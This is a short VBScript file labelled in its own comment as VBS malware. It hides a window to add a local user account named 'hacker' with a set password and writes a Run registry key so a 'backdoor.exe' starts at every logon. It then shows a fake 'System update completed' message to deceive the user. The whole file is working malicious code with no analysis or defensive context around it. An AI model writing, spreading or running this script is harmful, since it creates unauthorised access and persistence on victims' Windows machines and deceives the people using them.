' VBS malware - tao process + ghi registry
Set sh = CreateObject("WScript.Shell")
sh.Run "cmd /c net user hacker P@ssw0rd /add", 0, False
sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\backdoor", "C:\Temp\backdoor.exe", "REG_SZ"
MsgBox "System update completed", 64, "Update"
